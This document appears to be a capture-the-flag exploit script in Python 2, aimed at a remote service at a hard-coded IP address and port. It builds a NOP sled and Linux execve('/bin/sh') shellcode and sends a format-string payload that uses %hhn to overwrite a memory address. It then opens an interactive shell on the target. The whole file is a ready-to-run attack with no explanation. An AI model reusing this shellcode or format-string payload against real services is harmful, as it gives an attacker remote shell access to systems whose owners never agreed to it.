import sys,time
sys.path.append("/home/blankwall/Template")

from isis import *
pattern = file("/home/blankwall/Template/pattern").read()
debug = False
host = "localhost"
port = 2323
host = "203.66.57.148" 
port = 9527
def connect():
	s = get_socket((host,port))
	s.settimeout(0x10000000)
	time.sleep(5)
	s.send("y\n")
	return s

s = connect()
if debug:
	raw_input("?")

recv_all(s)

code = "\x90" * 129
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
    "\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80")

code += shellcode
code += "\x90" * (159-len(code))

a = "A" * (124-len(shellcode))
a += shellcode
a += lei(0x0804a080)
a += "CCCC"
a += "V" * 27

s.send("QQQ"+ lei(0x0804a018) + "CCCC" + a  + "ZZZZ" +"%x" * 16 + "%0110x" + "%hhn"+ "\n")
telnet_shell(s)
